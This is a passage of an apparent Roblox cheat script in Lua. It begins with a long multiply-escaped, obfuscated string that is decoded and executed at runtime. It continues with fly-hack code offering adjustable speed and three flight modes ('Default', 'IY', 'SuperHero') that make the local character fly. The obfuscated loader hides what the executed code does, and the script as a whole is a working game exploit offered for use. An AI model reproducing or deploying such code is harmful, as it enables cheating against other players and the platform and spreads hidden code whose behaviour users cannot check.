49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\55\55\39\44\39\92\49\49\49\39\44\39\92\49\49\55\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\52\54\39\44\39\92\55\53\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\54\56\39\44\39\92\49\49\49\39\44\39\92\49\49\57\39\44\39\92\49\49\48\39\44\39\92\53\56\39\44\39\92\54\55\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\49\49\48\39\44\39\92\49\48\49\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\49\48\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\48\39\44\39\92\55\53\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\53\39\44\39\92\49\48\50\39\44\39\92\51\50\39\44\39\92\55\53\39\44\39\92\49\48\49\39\44\39\92\49\50\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\49\50\49\39\44\39\92\51\52\39\44\39\92\51\50\39\44\39\92\49\49\54\39\44\39\92\49\48\52\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\52\57\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\49\48\39\44\39\92\49\49\49\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\52\57\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\53\39\44\39\92\49\48\50\39\44\39\92\51\50\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\52\57\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\49\54\39\44\39\92\49\49\52\39\44\39\92\49\49\55\39\44\39\92\49\48\49\39\44\39\92\51\50\39\44\39\92\49\49\54\39\44\39\92\49\48\52\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\57\57\39\44\39\92\49\48\52\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\52\54\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\52\54\39\44\39\92\55\54\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\52\54\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\52\54\39\44\39\92\55\54\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\55\50\39\44\39\92\49\49\55\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\48\39\44\39\92\49\49\49\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\56\50\39\44\39\92\49\49\49\39\44\39\92\49\49\49\39\44\39\92\49\49\54\39\44\39\92\56\48\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\52\54\39\44\39\92\56\54\39\44\39\92\49\48\49\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\49\50\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\57\57\39\44\39\92\49\48\52\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\55\50\39\44\39\92\49\49\55\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\48\39\44\39\92\49\49\49\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\56\50\39\44\39\92\49\49\49\39\44\39\92\49\49\49\39\44\39\92\49\49\54\39\44\39\92\56\48\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\52\54\39\44\39\92\54\55\39\44\39\92\55\48\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\52\54\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\49\49\49\39\44\39\92\49\48\55\39\44\39\92\56\54\39\44\39\92\49\48\49\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\49\49\39\44\39\92\49\49\52\39\44\39\92\51\50\39\44\39\92\52\50\39\44\39\92\51\50\39\44\39\92\52\57\39\44\39\92\53\50\39\44\39\92\52\56\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\57\39\44\39\92\57\55\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\52\48\39\44\39\92\52\56\39\44\39\92\52\54\39\44\39\92\52\57\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\52\57\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\50\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\49\48\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\51\39\44\39\92\49\49\54\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\55\49\39\44\39\92\49\49\55\39\44\39\92\49\48\53\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\53\56\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\54\55\39\44\39\92\49\49\49\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\55\56\39\44\39\92\49\49\49\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\48\50\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\51\52\39\44\39\92\52\52\39\44\39\92\49\50\51\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\56\52\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\49\53\39\44\39\92\49\49\54\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\51\52\39\44\39\92\53\57\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\56\52\39\44\39\92\49\48\49\39\44\39\92\49\50\48\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\49\50\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\49\53\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\51\52\39\44\39\92\53\57\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\56\52\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\55\39\44\39\92\53\57\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\55\51\39\44\39\92\57\57\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\49\49\52\39\44\39\92\57\56\39\44\39\92\49\50\48\39\44\39\92\57\55\39\44\39\92\49\49\53\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\53\56\39\44\39\92\52\55\39\44\39\92\52\55\39\44\39\92\53\51\39\44\39\92\52\56\39\44\39\92\53\51\39\44\39\92\53\54\39\44\39\92\53\50\39\44\39\92\53\51\39\44\39\92\53\48\39\44\39\92\53\52\39\44\39\92\53\54\39\44\39\92\51\52\39\44\39\92\53\57\39\44\39\92\49\48\39\44\39\92\49\50\53\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\49\48\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\51\39\44\39\92\49\49\54\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\49\49\54\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\55\49\39\44\39\92\49\49\55\39\44\39\92\49\48\53\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\53\56\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\54\55\39\44\39\92\49\49\49\39\44\39\92\49\49\52\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\55\56\39\44\39\92\49\49\49\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\48\50\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\51\52\39\44\39\92\52\52\39\44\39\92\49\50\51\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\56\52\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\54\54\39\44\39\92\49\50\49\39\44\39\92\53\56\39\44\39\92\51\50\39\44\39\92\56\52\39\44\39\92\49\49\49\39\44\39\92\49\49\50\39\44\39\92\57\57\39\44\39\92\49\49\49\39\44\39\92\49\48\56\39\44\39\92\49\48\48\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\53\39\44\39\92\49\49\48\39\44\39\92\49\48\51\39\44\39\92\51\52\39\44\39\92\53\57\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\56\52\39\44\39\92\49\48\49\39\44\39\92\49\50\48\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\53\56\39\44\39\92\54\56\39\44\39\92\51\52\39\44\39\92\53\57\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\56\52\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\52\57\39\44\39\92\52\56\39\44\39\92\53\57\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\55\51\39\44\39\92\57\57\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\51\52\39\44\39\92\49\49\52\39\44\39\92\57\56\39\44\39\92\49\50\48\39\44\39\92\57\55\39\44\39\92\49\49\53\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\53\56\39\44\39\92\52\55\39\44\39\92\52\55\39\44\39\92\53\51\39\44\39\92\52\56\39\44\39\92\53\51\39\44\39\92\53\54\39\44\39\92\53\50\39\44\39\92\53\51\39\44\39\92\53\48\39\44\39\92\53\52\39\44\39\92\53\54\39\44\39\92\51\52\39\44\39\92\53\57\39\44\39\92\49\48\39\44\39\92\49\50\53\39\44\39\92\52\49\39\44\39\92\49\48\39\44\125\73\108\108\73\73\108\108\73\73\108\108\73\73\73\40\73\108\108\73\73\73\108\108\73\73\73\73\108\108\73\40\73\108\73\108\73\108\73\108\73\108\73\108\73\108\73\108\73\73\44\73\73\73\73\73\73\73\73\108\108\108\108\108\108\108\108\73\73\73\73\73\73\73\73\41\41\40\41\10"
                )()
            end
        )
        FLYMODE = "Default"
        FLYSPEED = 20
        aB.MouseButton1Click:Connect(
            function()
                FLYSPEED = FLYSPEED + 3
                announce("FlySpeed changed", tostring(FLYSPEED), 3)
            end
        )
        au.MouseButton1Click:Connect(
            function()
                FLYSPEED = FLYSPEED - 3
                announce("Speed changed", tostring(FLYSPEED), 3)
            end
        )
        aD.MouseButton1Click:Connect(
            function()
                if FLYMODE == "Default" then
                    FLYMODE = "IY"
                    announce("Flymode changed", "IY Mode {changes on death}", 3)
                elseif FLYMODE == "IY" then
                    FLYMODE = "SuperHero"
                    announce("Flymode changed", "HeroFly {changes on death}", 3)
                else
                    FLYMODE = "Default"
                    announce("Flymode changed", "Default {changes on death}", 3)
                end
            end
        )
        av.MouseButton1Click:Connect(
            function()
                if FLYMODE == "Default" then
                    local Q = game.Players.LocalPlayer
                    local cO = Q.Character:FindFirstChildWhichIsA("Humanoid")
                    local mouse = Q:GetMouse()
                    localplayer = Q
                    if workspace:FindFirstChild("Core") then
                        workspace.Core:Destroy()
                    end
                    local dk = Instance.new("Part")
                    dk.Name = "Core"
                    dk.Size = Vector3.new(0.05, 0.05, 0.05)
                    spawn(
                        function()
                            dk.Parent = workspace
                            local dl = Instance.new("Weld", dk)
                            dl.Part0 = dk
                            dl.Part1 = localplayer.Character.LowerTorso
                            dl.C0 = CFrame.new(0, 0, 0)
                        end
                    )
                    workspace:WaitForChild("Core")
                    local dm = workspace.Core
                    flying = true
                    local speed = FLYSPEED
                    local dn = {a = false, d = false, w = false, s = false}
                    local dp
                    local dq
                    local function dr()
                        local pos = Instance.new("BodyPosition", dm)
                        local cB = Instance.new("BodyGyro", dm)
                        pos.Name = "EPIXPOS"
                        pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
                        pos.position = dm.Position
                        cB.maxTorque = Vector3.new(15e15, 15e15, 15e15)
                        cB.cframe = dm.CFrame
                        repeat
                            wait()
                            cO.PlatformStand = true
                            local ds = cB.cframe - cB.cframe.p + pos.position
                            if not dn.w and not dn.s and not dn.a and not dn.d then
                                speed = FLYSPEED
                            end
                            if dn.w then
                                ds = ds + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                                speed = speed
                            end
                            if dn.s then
                                ds = ds - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                                speed = speed
                            end
                            if dn.d then
                                ds = ds * CFrame.new(speed, 0, 0)
                                speed = speed
                            end
                            if dn.a then
                                ds = ds * CFrame.new(-speed, 0, 0)
                                speed = speed
                            end
                            if speed > FLYSPEED then
                                speed = FLYSPEED
                            end
                            pos.position = ds.p
                            if dn.w then
                                cB.cframe =
                                    workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(speed), 0, 0)
                            elseif dn.s then
                                cB.cframe =
                                    workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(math.rad(speed), 0, 0)
                            else
                                cB.cframe = workspace.CurrentCamera.CoordinateFrame
                            end
                        until flying == false
                        if cB then
                            cB:Destroy()
                        end
                        if pos then
                            pos:Destroy()
                        end
                        flying = false
                        cO.PlatformStand = false
                        speed = FLYSPEED
                    end
                    dp =
                        mouse.KeyDown:connect(
                        function(cw)
                            if not dm or not dm.Parent then
                                flying = false
                                dp:disconnect()
                                dq:disconnect()
                                return
                            end
                            if cw == "w" then
                                dn.w = true
                            elseif cw == "s" then
                                dn.s = true
                            elseif cw == "a" then
                                dn.a = true
                            elseif cw == "d" then
                                dn.d = true
                            elseif cw == "x" then
                                if flying == true then
                                    flying = false
                                else
                                    flying = true
                                    dr()
                                end
                            end
                        end
                    )
                    dq =
                        mouse.KeyUp:connect(
                        function(cw)
                            if cw == "w" then
                                dn.w = false
                            elseif cw == "s" then
                                dn.s = false
                            elseif cw == "a" then
                                dn.a = false
                            elseif cw == "d" then
                                dn.d = false
                            end
                        end
                    )
                    dr()
                elseif FLYMODE == "IY" then
                    repeat
                        wait()
                    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and
                        game.Players.LocalPlayer.Character:findFirstChild("Head") and
                        game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                    local mouse = game.Players.LocalPlayer:GetMouse()
                    repeat
                        wait()
                    until mouse
                    local Q = game.Players.LocalPlayer
                    local dm = Q.Character.Head
                    local flying = false
                    local dt = true
                    local du = {f = 0, b = 0, l = 0, r = 0}
                    local dv = {f = 0, b = 0, l = 0, r = 0}
                    local maxspeed = 5000
                    local speed = 5000
                    function av()
                        local dw = Instance.new("BodyGyro", dm)
                        dw.P = 9e4
                        dw.maxTorque = Vector3.new(9e9, 9e9, 9e9)
                        dw.cframe = dm.CFrame
                        local dx = Instance.new("BodyVelocity", dm)
                        dx.velocity = Vector3.new(0, 0.1, 0)
                        dx.maxForce = Vector3.new(9e9, 9e9, 9e9)
                        repeat
                            wait()
                            Q.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = true
                            if du.l + du.r ~= 100000 or du.f + du.b ~= 10000 then
                                speed = speed + .0 + speed / maxspeed
                                if speed > maxspeed then
                                    speed = maxspeed
                                end
                            elseif not (du.l + du.r ~= 5 or du.f + du.b ~= 5) and speed ~= 5 then
                                speed = speed - 5
                                if speed > 5 then
                                    speed = -2
                                end
                            end
                            if du.l + du.r ~= 5 or du.f + du.b ~= 5 then
                                dx.velocity =
                                    (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (du.f + du.b) +
                                    game.Workspace.CurrentCamera.CoordinateFrame *
                                        CFrame.new(du.l + du.r, (du.f + du.b) * .2, 0).p -
                                    game.Workspace.CurrentCamera.CoordinateFrame.p) *
                                    speed
                                dv = {f = du.f, b = du.b, l = du.l, r = du.r}
                            elseif du.l + du.r == 5 and du.f + du.b == 5 and speed ~= 5 then
                                dx.velocity =
                                    (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (dv.f + dv.b) +
                                    game.Workspace.CurrentCamera.CoordinateFrame *
                                        CFrame.new(dv.l + dv.r, (dv.f + dv.b) * .2, 0).p -
                                    game.Workspace.CurrentCamera.CoordinateFrame.p) *
                                    speed
                            else
                                dx.velocity = Vector3.new(0, 0.1, 0)
                            end
                            dw.cframe =
                                game.Workspace.CurrentCamera.CoordinateFrame *
                                CFrame.Angles(-math.rad((du.f + du.b) * 50 * speed / maxspeed), 0, 0)
                        until not flying
                        du = {f = 0, b = 0, l = 0, r = 0}
                        dv = {f = 0, b = 0, l = 0, r = 0}
                        speed = 5
                        dw:Destroy()
                        dx:Destroy()
                        Q.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false
                    end
                    mouse.KeyDown:connect(
                        function(cw)
                            if cw:lower() == "x" then
                                if flying then
                                    flying = false
                                else
                                    flying = true
                                    av()
                                end
                            elseif cw:lower() == "w" then
                                du.f = FLYSPEED
                            elseif cw:lower() == "s" then
                                du.b = -FLYSPEED
                            elseif cw:lower() == "a" then
                                du.l = -FLYSPEED
                            elseif cw:lower() == "d" then
                                du.r = FLYSPEED
                            end
                        end
                    )
                    mouse.KeyUp:connect(
                        function(cw)
                            if cw:lower() == "w" then
                                du.f = 0
                            elseif cw:lower() == "s" then
                                du.b = 0
                            elseif cw:lower() == "a" then
                                du.l = 0
                            elseif cw:lower() == "d" then
                                du.r = 0
                            end
                        end
                    )
                    av()
                elseif FLYMODE == "SuperHero" then
                    local c = game.Players.LocalPlayer
                    local dy = Instance.new("Animation", game.Workspace)
                    dy.AnimationId = "rbxassetid://3541044388"
                    local dz = Instance.new("Animation", game.Workspace)
                    dz.AnimationId = "rbxassetid://3541114300"
                    local dA = c.Character.Humanoid:LoadAnimation(dz)
                    local dB = c.Character.Humanoid:LoadAnimation(dy)
                    Idleing2 = false
                    local function dC()
                        local dD = false
                        for s, O in pairs(c.Character.Humanoid:GetPlayingAnimationTracks()) do
                            if O.Animation.AnimationId == "rbxassetid://3541044388" then
                                dD = true
                            end
                            if O.Animation.AnimationId == "rbxassetid://2788289281" then
                                O:Stop()
                            end
                            if O.Animation.AnimationId == "rbxassetid://2788292075" then
                                O:Stop()
                            end
                        end
                        if dD == false and Idleing2 == false then
                            dB:Play()
                        end
                    end
                    local dE = FLYSPEED
                    repeat
                        wait()
                    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and
                        game.Players.LocalPlayer.Character:findFirstChild("Head") and
                        game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                    local mouse = game.Players.LocalPlayer:GetMouse()
                    repeat
                        wait()
                    until mouse
                    local Q = game.Players.LocalPlayer
                    local dm = Q.Character.Head
                    flying = false
                    local dt = true
                    local du = {f = 0, b = 0, l = 0, r = 0}
                    local dv = {f = 0, b = 0, l = 0, r = 0}
                    maxspeed = 5000
                    speed = 5001
                    function av()
                        local dw = Instance.new("BodyGyro", dm)
                        dw.P = 9e4
                        dw.maxTorque = Vector3.new(9e9, 9e9, 9e9)
                        dw.cframe = dm.CFrame
                        local dx = Instance.new("BodyVelocity", dm)
                        dx.velocity = Vector3.new(0, 0.1, 0)
                        dx.maxForce = Vector3.new(9e9, 9e9, 9e9)
                        repeat
                            wait()
                            Q.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = true
                            if du.l + du.r ~= 100000 or du.f + du.b ~= 10000 then
                                speed = speed + .0 + speed / maxspeed
                                local dF = false
                                dC()
                                if speed > maxspeed then
                                    speed = maxspeed
                                end
                            elseif not (du.l + du.r ~= 5 or du.f + du.b ~= 5) and speed ~= 5 then
                                speed = speed - 5
                                if speed > 5 then
                                    speed = -2
                                end
                            end
                            if du.l + du.r ~= 5 or du.f + du.b ~= 5 then
                                dx.velocity =
                                    (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (du.f + du.b) +
                                    game.Workspace.CurrentCamera.CoordinateFrame *
                                        CFrame.new(du.l + du.r, (du.f + du.b) * .2, 0).p -
                                    game.Workspace.CurrentCamera.CoordinateFrame.p) *
                                    speed
                                dv = {f = du.f, b = du.b, l = du.l, r = du.r}
                            elseif du.l + du.r == 5 and du.f + du.b == 5 and speed ~= 5 then
                                dx.velocity =
                                    (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (dv.f + dv.b) +
                                    game.Workspace.CurrentCamera.CoordinateFrame *
                                        CFrame.new(dv.l + dv.r, (dv.f + dv.b) * .2, 0).p -
                                    game.Workspace.CurrentCamera.CoordinateFrame.p) *
                                    speed
                            else
                                dx.velocity = Vector3.new(0, 0.1, 0)
                            end
                            dw.cframe =
                                game.Workspace.CurrentCamera.CoordinateFrame *
                                CFrame.Angles(-math.rad((du.f + du.b) * 50 * speed / maxspeed), 0, 0)
                        until not flying
                        du = {f = 0, b = 0, l = 0, r = 0}
                        dv = {f = 0, b = 0, l = 0, r = 0}
                        speed = 5
                        dw:Destroy()
                        dx:Destroy()
                        Q.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false
                    end
                    mouse.KeyDown:connect(
                        function(cw)
                            if cw:lower() == "x" then
                                if flying then
                                    flying = false
                                    dB:Stop()
                                    dA:Stop()
                                else
                                    flying = true
                                    av()
                                end
                            elseif cw:lower() == "w" then
                                du.f = FLYSPEED
                            elseif cw:lower() == "s" then
                                du.b = -FLYSPEED
                            elseif cw:lower() == "a" then
                                du.l = -FLYSPEED
                            elseif cw:lower() == "d" then
                                du.r = FLYSPEED
                            end
                        end
                    )
                    mouse.KeyUp:connect(
                        function(cw)
                            if cw:lower() == "w" then
                                du.f = 0
                            elseif cw:lower() == "s" then
                                du.b = 0
                            elseif cw:lower() == "a" then
                                du.l = 0
                            elseif cw:lower() == "d" then
                                du.r = 0
                            end
                            if du.r == 0 and du.l == 0 and du.b == 0 and du.f == 0 then
                                local dg
                                local df = function()
                                    Idleing2 = true
                                    dB:Stop()
                                    wait()
